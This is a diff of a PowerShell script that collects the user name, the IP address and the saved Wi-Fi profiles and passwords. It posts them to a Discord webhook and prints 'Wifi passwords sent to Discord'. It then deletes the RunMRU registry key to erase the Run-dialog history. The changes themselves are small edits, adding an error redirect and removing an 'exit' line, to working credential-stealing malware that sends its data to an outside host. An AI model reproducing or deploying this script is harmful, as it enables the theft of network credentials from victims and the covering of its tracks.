@@ -1,7 +1,7 @@
 # Get user name and ip
 $user = $env:USERNAME
 $ip = (Test-Connection -ComputerName (hostname) -Count 1).IPV4Address.IPAddressToString
-
+Write-Error > error.txt
 
 $wifiProfiles = netsh wlan show profiles |
                 Select-String -Pattern ":" |
@@ -48,9 +48,5 @@ Invoke-RestMethod -Uri $hookurl -Method Post -Body $jsonBody -ContentType "appli
 print("Wifi passwords sent to Discord")
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-
-
-exit
 
 
